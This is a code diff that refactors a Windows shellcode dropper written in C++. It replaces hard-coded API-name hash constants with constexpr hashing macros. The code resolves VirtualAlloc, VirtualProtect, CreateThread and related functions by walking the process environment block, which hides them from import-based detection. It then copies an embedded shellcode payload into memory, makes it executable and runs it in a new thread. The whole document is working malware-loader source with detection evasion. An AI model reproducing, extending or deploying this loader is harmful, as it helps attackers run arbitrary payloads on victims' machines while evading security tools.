@@ -70,22 +70,11 @@ struct LDR_DATA_TABLE_ENTRY
 };
 ```
 
-# apihashing.h
+# dropper.cpp
 ```c
 #include "pestructs.h"
 
-unsigned int yz_hash(char* string);
-
-FARPROC WINAPI GetProcAddressByHash(HMODULE hModule, unsigned int hash);
-
-FARPROC WINAPI GetByHash(unsigned int moduleHash, unsigned int functionHash);
-```
-
-# apihashing.cpp
-```c
-#include "apihashing.h"
-
-unsigned int yz_hash(char* string)
+constexpr unsigned int hash(const char* string)
 {
 	unsigned int hash = 0x86735296;
 	unsigned int i = 0;
@@ -103,6 +92,26 @@ unsigned int yz_hash(char* string)
 	return hash;
 }
 
+
+#define TOSTRING( x ) #x
+#define CONCAT( X, Y ) X##Y
+
+#define INITDLL( DLL, VAL ) constexpr int CONCAT( hash, DLL ) = hash( VAL );
+#define INITFUNC( FUNC, RETTYPE, ...) constexpr int CONCAT( hash, FUNC ) = hash( TOSTRING( FUNC ) );\
+										using CONCAT( type, FUNC ) = RETTYPE( WINAPI* )( __VA_ARGS__ );
+
+#define API( DLL, FUNC ) ( ( CONCAT( type, FUNC ))GetByHash( CONCAT( hash, DLL ) ,CONCAT( hash, FUNC ) ) )
+
+INITDLL(KERNEL32, "KERNEL32.DLL")
+INITDLL(NTDLL, "NTDLL.DLL")
+
+INITFUNC(VirtualAlloc, LPVOID, LPVOID, SIZE_T, DWORD, DWORD);
+INITFUNC(RtlMoveMemory , VOID,VOID UNALIGNED* , VOID UNALIGNED* , SIZE_T );
+INITFUNC(VirtualProtect , BOOL,LPVOID , SIZE_T , DWORD , PDWORD );
+INITFUNC(CreateThread , HANDLE,LPSECURITY_ATTRIBUTES , SIZE_T , LPTHREAD_START_ROUTINE , __drv_aliasesMem LPVOID , DWORD , LPDWORD );
+INITFUNC(WaitForSingleObject , DWORD,HANDLE , DWORD );
+
+
 FARPROC WINAPI GetByHash(unsigned int moduleHash, unsigned int functionHash)
 {
 #ifdef _M_IX86
@@ -111,19 +120,15 @@ FARPROC WINAPI GetByHash(unsigned int moduleHash, unsigned int functionHash)
 	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
 #endif
 
-	PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr;
-	LIST_ENTRY* ModuleList = NULL;
+	LIST_ENTRY* ModuleList = &ProcEnvBlk->Ldr->InMemoryOrderModuleList;
 
-	ModuleList = &Ldr->InMemoryOrderModuleList;
-	LIST_ENTRY* pStartListEntry = ModuleList->Flink;
-
-	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
+	for (LIST_ENTRY* pListEntry = ModuleList->Flink; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
 	{
 		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
 
-		char result[256]{};int i = 0;do {result[i] = pEntry->BaseDllName.Buffer[i];} while (result[i++] != 0);
+		char result[256]{}; int i = 0; do { result[i] = pEntry->BaseDllName.Buffer[i]; } while (result[i++] != 0);
 
-		if (yz_hash(result) == moduleHash)
+		if (hash(result) == moduleHash)
 		{
 			char* pBaseAddr = (char*)(HMODULE)pEntry->DllBase;
 
@@ -143,7 +148,7 @@ FARPROC WINAPI GetByHash(unsigned int moduleHash, unsigned int functionHash)
 			{
 				char* sTmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];
 
-				if (yz_hash(sTmpFuncName) == functionHash)
+				if (hash(sTmpFuncName) == functionHash)
 				{
 					pProcAddress = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
 					break;
@@ -155,36 +160,6 @@ FARPROC WINAPI GetByHash(unsigned int moduleHash, unsigned int functionHash)
 
 	return NULL;
 }
-```
-
-# dropper.h
-```c
-#pragma once
-
-#include "apihashing.h"
-
-#define KERNEL32DLL 892052424
-#define NTDLLDLL 3869592240
-
-#define VIRTUALALLOC 892002778
-using apiVirtualAlloc = LPVOID(WINAPI*)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-
-#define RTLMOVEMEMORY 1784060384
-using apiRtlMoveMemory = VOID(WINAPI*)(VOID UNALIGNED* Destination, VOID UNALIGNED* Source, SIZE_T Length);
-
-#define VIRTUALPROTECT 3568005504
-using apiVirtualProtect = BOOL(WINAPI*)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-
-#define CREATETHREAD 891970904
-using apiCreateThread = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-
-#define WAITFORSINGLEOBJECT 2516010684
-using apiWaitForSingleObject = DWORD(WINAPI*)(HANDLE hHandle, DWORD dwMilliseconds);
-```
-
-# dropper.cpp
-```c
-#include "dropper.h"
 
 unsigned char payload[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
@@ -210,18 +185,16 @@ unsigned int payloadSize = sizeof(payload);
 
 int main()
 {
-	void* allocatedMemory = ((apiVirtualAlloc)GetByHash(KERNEL32DLL, VIRTUALALLOC))(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (allocatedMemory == 0) return 1;
+	void* allocatedMemory = API(KERNEL32, VirtualAlloc)(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	((apiRtlMoveMemory)GetByHash(NTDLLDLL, RTLMOVEMEMORY))(allocatedMemory, payload, payloadSize);
+	API(NTDLL, RtlMoveMemory)(allocatedMemory, payload, payloadSize);
 
 	DWORD oldProtect = 0;
-	((apiVirtualProtect)GetByHash(KERNEL32DLL, VIRTUALPROTECT))(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
+	API(KERNEL32, VirtualProtect)(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
 
-	HANDLE thread = ((apiCreateThread)GetByHash(KERNEL32DLL, CREATETHREAD))(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);
-	if (thread == 0) return 1;
+	HANDLE thread = API(KERNEL32, CreateThread)(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);
 
-	((apiWaitForSingleObject)GetByHash(KERNEL32DLL, WAITFORSINGLEOBJECT))(thread, INFINITE);
+	API(KERNEL32, WaitForSingleObject)(thread, INFINITE);
 
 	return 0;
 }
